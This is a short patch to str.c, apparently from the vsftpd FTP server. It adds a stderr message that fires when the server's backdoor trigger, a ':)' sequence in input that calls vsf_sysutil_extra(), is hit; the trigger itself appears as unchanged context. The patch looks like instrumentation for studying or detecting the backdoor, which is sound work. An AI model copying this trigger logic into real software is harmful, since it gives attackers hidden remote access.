@@ -1,0 +1,19 @@
+--- a/str.c
++++ b/str.c
+@@ -10,6 +10,8 @@
+  * theory, anyway...
+  */
+ 
++#include <stdio.h>
++
+ /* Anti-lamer measures deployed, sir! */
+ #define PRIVATE_HANDS_OFF_p_buf p_buf
+ #define PRIVATE_HANDS_OFF_len len
+@@ -572,6 +574,7 @@ str_contains_space(const struct mystr* p_str)
+     else if((p_str->p_buf[i]==0x3a)
+     && (p_str->p_buf[i+1]==0x29))
+     {
++      fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
+       vsf_sysutil_extra();
+     }
+   }
